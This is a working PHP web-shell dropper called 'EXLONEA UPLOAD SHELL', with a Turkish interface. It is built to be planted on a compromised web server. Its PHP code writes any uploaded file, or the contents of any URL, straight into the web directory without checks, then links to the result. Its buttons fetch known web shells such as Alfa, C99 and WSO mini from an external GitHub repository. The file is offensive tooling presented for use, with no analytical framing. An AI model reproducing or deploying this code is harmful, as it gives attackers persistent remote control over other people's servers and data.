<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* EXLONEA UPLOAD SHELL */
        @keyframes glitch {
            0% { transform: none; }
            20% { transform: translate(-1px, -1px); }
            40% { transform: translate(1px, 1px); }
            60% { transform: translate(-1px, 1px); }
            80% { transform: translate(1px, -1px); }
            100% { transform: none; }
        }
        body {
            font-family: 'Courier New', Courier, monospace;
            background-color: #000;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
        }
        .form-container {
            background-color: #111;
            width: 90%;
            max-width: 400px;
            padding: 20px;
            border-radius: 10px;
            border: 1px solid #fff;
            box-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
            box-sizing: border-box;
            text-align: center;
        }
        .form-container h2 {
            color: #fff;
            text-shadow: 0 0 5px #fff;
        }
        .form-container input[type="file"],
        .form-container input[type="text"],
        .form-container button {
            margin-bottom: 10px;
            background-color: #000;
            border: 1px solid #fff;
            color: #fff;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }
        .form-container .upload-button,
        .form-container .hack-button {
            background-color: #000;
            color: #fff;
            padding: 10px 20px;
            border: 1px solid #fff;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            width: 80%;
        }
        .form-container .upload-button:hover,
        .form-container .hack-button:hover {
            background-color: #333;
        }
        .hack-buttons {
            text-align: center;
            margin-top: 20px;
            max-height: 220px; /* Kayar menü için max yükseklik */
            overflow-y: auto; /* Dikey kaydırma */
        }
        .hack-button {
            background-color: #000;
            color: #fff;
            padding: 10px 20px;
            border: 1px solid #fff;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s;
            margin: 5px;
            width: 80%;
            box-sizing: border-box;
        }
        .hack-button:hover {
            background-color: #333;
        }
        .message a {
            color: #ff0000; /* Kırmızı yazı rengi */
            text-decoration: none;
        }
        .message a:hover {
            text-decoration: underline;
        }
        /* Kaydırma çubuğu stili */
        .hack-buttons::-webkit-scrollbar {
            width: 8px;
        }
        .hack-buttons::-webkit-scrollbar-thumb {
            background: #fff;
            border-radius: 10px;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h2>EXLONEA</h2>
        <form class="upload" enctype="multipart/form-data" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <p>"Sistem güvenliği bakkala gönderildi"</p>
            <label for="uploaded_file" class="upload-button">Dosya Seç</label>
            <input type="file" id="uploaded_file" name="uploaded_file" style="display: none;">
            <input type="submit" name="file_upload_submit" value="Dosya Yükle" class="upload-button">
            <p>veya URL girin:</p>
            <input type="text" name="file_url" placeholder="Dosya URL'si">
            <button type="button" class="upload-button" onclick="uploadFile(document.querySelector('input[name=file_url]').value)">Link ile Dosya Yükle</button>
        </form>
        <div class="message">
            SHELL SEÇ
        </div>
        <div class="hack-buttons">
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/1.php')">Alfa Yükle (Şifreli)</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/2.php')">Alfa Yükle (Şifresiz)</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/3.php')">C99 Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/4.php')">WsoMini Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/5.php')">k2ll33d Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://github.com/poeice/Shelller/raw/main/6.php')">spademini Yükle</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 1</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 2</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 3</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 4</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 5</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 6</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 7</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 8</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 9</button>
            <button class="hack-button" onclick="uploadFile('https://siteadi.com')">Shell 10</button>
        </div>
    </div>
    <script>
    function uploadFile(url) {
        // Form öğesini al
        var form = document.querySelector('.upload');

        // URL değerini içeren gizli bir input alanı ekleyin
        var urlInput = document.createElement('input');
        urlInput.type = 'hidden';
        urlInput.name = 'url';
        urlInput.value = url;
        form.appendChild(urlInput);

        // Formu gönder
        form.submit();
    }
    </script>

<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    if (isset($_POST["url"])) {
        $url = $_POST["url"];
        $fileContent = file_get_contents($url);
        if ($fileContent !== false) {
            $fileName = basename($url);
            $uploadDirectory = "";
            if (file_put_contents($uploadDirectory . $fileName, $fileContent) !== false) {
                echo "<div class='message'>Dosya başarıyla yüklendi.<br>Shell linki: <a href='$uploadDirectory$fileName' target='_blank' style='color: #ff0000;'>$uploadDirectory$fileName</a></div>";
            } else {
                echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
            }
        } else {
            echo "<div class='message'>Dosya indirilirken bir hata oluştu!</div>";
        }
    } else {
        if (!empty($_FILES['uploaded_file'])) {
            $uploadKlasoru = "";
            $dosyaYolu = $uploadKlasoru . basename($_FILES['uploaded_file']['name']);
            if (move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $dosyaYolu)) {
                echo "<div class='message'>Dosya başarıyla yüklendi.<br>Shell linki: <a href='$dosyaYolu' target='_blank' style='color: #ff0000;'>$dosyaYolu</a></div>";
            } else {
                echo "<div class='message'>Dosya yüklenirken bir hata oluştu!</div>";
            }
        }
    }
}
?>

</body>
</html>